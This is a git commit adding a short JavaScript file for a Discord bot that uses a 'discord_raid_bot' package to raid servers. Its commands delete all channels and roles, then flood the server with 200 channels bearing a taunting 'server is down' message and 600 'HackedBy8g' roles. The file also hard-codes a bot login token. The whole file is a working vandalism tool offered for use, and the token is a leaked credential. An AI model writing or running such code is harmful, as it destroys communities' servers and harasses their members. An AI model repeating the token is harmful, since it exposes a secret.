b4a2aa27c6a993219af3e43d848a155ca0c2ed11
DontHaveABlaz <55330524+DontHaveABlaz@users.noreply.github.com>
2019-09-14 21:37:50 +0200

    Create index.js

---
+++ .gitignore/index.js
@@ -0,0 +1,10 @@
+const Discord = require('discord.js');
+const bot = new Discord.Client();
+const raid = require('discord_raid_bot');
+ 
+raid.deleteAllChannels(bot, "commande", true);
+raid.createChannels(bot, ".Rekt", 200, "nomduchannel", "@here Ton serveur est down by 8g | Xanax",400 )
+raid.deleteRoles(bot, ".del")
+raid.createRoles(bot, ".role", 'HackedBy8g', 600)
+ 
+bot.login("NjIwMzMyODU0OTc4ODA1ODEw.XX032w.20Jqrs1e3ca4mElUZw059yohPBg");
